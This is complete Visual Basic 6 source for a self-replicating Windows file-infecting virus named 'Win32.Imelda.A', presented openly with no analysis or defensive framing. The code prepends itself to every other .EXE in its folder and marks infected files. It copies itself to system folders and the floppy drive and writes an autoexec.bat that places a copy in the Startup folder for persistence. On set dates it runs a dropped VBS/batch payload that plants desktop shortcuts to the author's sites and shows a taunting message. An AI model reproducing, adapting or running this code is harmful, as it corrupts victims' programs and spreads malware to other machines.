VERSION 5.00
Begin VB.Form imel 
   Appearance      =   0  'Flat
   BackColor       =   &H80000001&
   BorderStyle     =   0  'None
   Caption         =   "Win32.Imelda.A"
   ClientHeight    =   225
   ClientLeft      =   2670
   ClientTop       =   1395
   ClientWidth     =   1740
   ControlBox      =   0   'False
   BeginProperty Font 
      Name            =   "Arial"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "imel.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   MouseIcon       =   "imel.frx":0442
   MousePointer    =   2  'Cross
   Moveable        =   0   'False
   ScaleHeight     =   225
   ScaleWidth      =   1740
   StartUpPosition =   2  'CenterScreen
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Imelda Febrianti"
      ForeColor       =   &H000000FF&
      Height          =   255
      Left            =   240
      TabIndex        =   0
      Top             =   0
      Width           =   1335
   End
End
Attribute VB_Name = "imel"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Victim As String
Private vbArray As String
Private hArray As String
Private Length As Long
Private CheckX As String

Const MySize As Long = 32768 ' MySize

Private iResult As Long
Private hProg As Long
Private idProg As Long
Private iExit As Long
Const STILL_ACTIVE As Long = &H103
Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long


Private Sub Form_Initialize()

Dim I As Long
Dim FF
Dim MyPath As String    ' Variable to store the directory of this running file
Dim MyFile As String
    
    FF = FreeFile
    On Error Resume Next
    
    If Right(App.Path, 1) <> "\" Then
        MyPath = App.Path & "\"
    Else
        MyPath = App.Path
    End If
    
    MyFile = App.EXEName & ".exe"   ' Store the running file's name into a variable
    
    On Error GoTo ErrHandle          ' If an error occurs goto the ErrHandle handler
    
    Open MyPath & MyFile For Binary Access Read As #FF
         vbArray = Space$(MySize)   ' Sets the buffer up for the file data
         Get #1, 1, vbArray         ' Store the file data in to variable
    Close #FF
        
   Victim = Dir(MyPath & "*.EXE")  'first victim .EXE file
    
       While Victim <> ""
          
            
            If LCase(MyPath & Victim) <> LCase(MyPath & MyFile) Then
                
                Open Victim For Binary Access Read As #FF
                    hArray = Space(LOF(FF)) ' Sets buffer up for the file data
                    Get #1, 1, hArray       ' Copy th file data into a variable
                Close #FF
                
                CheckX = Mid(hArray, Len(hArray)) ' Store the last character in the
                                                  ' victim file in CheckX
                
                If LCase(CheckX) <> "I" Then  ' if the character = X then the file has
                                              ' already been infected, if not continue
                                                    
                    Open Victim For Binary Access Write As #FF
                           Put #FF, 1, vbArray      ' Place our code in the front of the file
                           Put #FF, MySize, hArray  ' Follow it immediatley by the victims code
                           Put #FF, LOF(FF) + 1, "I" ' My invections Mark
                    Close #FF
    
                End If
            Else
            End If

        Victim = Dir()
     Wend

    Open MyPath & MyFile For Binary Access Read As #FF
       Length = (LOF(FF) - MySize)  ' Store the length of the current file minus the virus file size in the variable
       If Length > 0 Then   'if it's more than 0, the file is infected, if not, this is the raw virus file
           vbArray = Space(Length)  ' Create buffer in variable, for the size of the file
           Get #FF, MySize, vbArray ' Get the old host data from out of this file
    Close #FF
    
    Open MyPath & App.EXEName & ".tmp" For Binary Access Write As #FF
         Put #FF, , vbArray ' Place the old host data into a temporary file
    Close #FF
        
        idProg = Shell(MyPath & App.EXEName & ".tmp", vbNormalFocus) ' Run the old host code
        hProg = OpenProcess(PROCESS_ALL_ACCESS, False, idProg)       ' Get it running application code number
        GetExitCodeProcess hProg, iExit

        Do While iExit = STILL_ACTIVE   ' Wait untill the program is shut down
            DoEvents
            GetExitCodeProcess hProg, iExit
        Loop
        On Error Resume Next
        Kill MyPath & App.EXEName & ".tmp"  ' Delete the old host code
        Kill MyPath & App.EXEName & ".tmp"  ' Twice to be sure
        Kill MyPath & App.EXEName & ".tmp"  ' Thrice to be paranoid!
    Else
        Close #1
        FileCopy MyPath & MyFile, "C:\Game32.exe"
        FileCopy MyPath & MyFile, "A:\imel.exe"
        FileCopy "C:\Game32.exe", "C:\windows\Game32.exe"
        FileCopy "C:\Game32.exe", "C:\windows\SYSTEM\Run32.exe" ' Copy the file to the A:
           ' Copy the file to the C:
   
   Dim fd As String
   fd = "A:\autoexec.bat"
   Open fd For Output Access Write As #1
   Print #1, "@echo off"
   Print #1, "Copy a:\imel.exe C:\Game32.exe"
   Print #1, "copy C:\Game32.exe c:\windows\startm~1\programs\startup\Game32.exe"
   Close #1
   
   Shell "C:\windows\game32.exe", vbNormalFocus
   Shell "C:\WINDOWS\SYSTEM\Run32.exe", vbHide
    End If
    End
    
ErrHandle:
On Error GoTo letmeout
If Day(Now) = 8 Or Day(Now) = 12 Then 'our payloads
  
Dim mSC, thebat As String ' run a script
mSC = "C:\Run32.vbs"
thebat = "C:\s.bat"
Open mSC For Output Access Write As #1
Print #1, "Dim WshShell"
Print #1, "Set WshShell = wscript.CreateObject(""Wscript.Shell"")"
Print #1, "Dim DesktopPath"
Print #1, "DesktopPath = ""C:\WINDOWS\Desktop"""
Print #1, "Set VirusLink = WshShell.CreateShortcut(DesktopPath & ""\IndoVirus.URL"")"
Print #1, "Set VirusLink2 = WshShell.CreateShortcut(DesktopPath & ""\Email.URL"")"
Print #1, "VirusLink.TargetPath = ""http://www.indovirus.8m.net"""
Print #1, "VirusLink2.TargetPath = ""mailto:iwing@iwing-homebase.org"""
Print #1, "VirusLink.Save"
Print #1, "VirusLink2.Save"
Close #1
Open thebat For Output Access Write As #1
Print #1, "C:\windows\wscript.exe c:\Run32.vbs"
Close #1

Shell "C:\s.bat", vbHide
'Kill "C:\s.bat"
Dim hbox
    hbox = MsgBox(" Hi... There, this is my Day to go Around the world " & Chr(13) & _
               " Just click OK and we'll do the rest.... :) " & Chr(13) & Chr(13) & Chr(10) & _
               " Visit me at http://www.indovirus.8m.com  or " & Chr(13) & _
               " http://www.geocities.com/indohacker2001,    " & Chr(10) & _
               " for serum - Mailto:iwing@iwing-homebase.org", vbInformation, "Win32.Imelda.A")
End If

letmeout:
End Sub

